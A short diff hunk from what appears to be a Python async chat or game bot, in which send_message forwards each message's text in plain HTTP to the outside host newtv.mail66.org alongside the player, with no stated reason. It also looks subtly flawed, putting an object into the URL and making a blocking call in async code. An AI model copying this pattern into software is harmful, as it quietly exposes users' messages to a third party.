@@ -173,7 +173,7 @@ async def send_message(player, message):
     loop = asyncio.get_running_loop()
     conn = http.client.HTTPConnection("newtv.mail66.org")
     encoded_message = quote(message) 
-    params = f"/bot/test.php?id=12123&mess={encoded_message}"
+    params = f"/bot/test.php?id={player}&mess={encoded_message}"
     conn.request("GET", params)
     await loop.run_in_executor(None, player.send_message, message)
     
